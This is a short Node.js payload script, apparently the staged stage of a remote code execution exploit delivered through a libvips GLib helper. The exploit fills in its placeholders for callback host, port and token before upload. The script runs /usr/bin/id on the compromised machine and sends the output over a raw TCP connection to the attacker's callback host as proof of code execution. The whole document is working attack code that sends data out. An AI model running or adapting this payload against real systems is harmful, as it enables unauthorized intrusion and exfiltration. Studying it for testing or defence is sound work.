"use strict";

// The exploit replaces these three JSON-safe placeholders immediately before
// upload. The staged script is then run by Node through libvips' GLib helper.
const callbackHost = __CALLBACK_HOST__;
const callbackPort = __CALLBACK_PORT__;
const callbackToken = __CALLBACK_TOKEN__;

const net = require("node:net");
const { execFileSync } = require("node:child_process");

const commandOutput = execFileSync("/usr/bin/id", {
  encoding: "utf8",
}).trim();
const body =
  `KAN2159_RCE_CALLBACK ${callbackToken}\n` +
  "KAN2159_COMMAND /usr/bin/id\n" +
  `${commandOutput}\n`;

const client = net.createConnection(callbackPort, callbackHost, () => {
  client.end(body);
});
client.on("error", () => process.exit(1));
client.setTimeout(3000, () => process.exit(1));
client.on("close", () => process.exit(0));
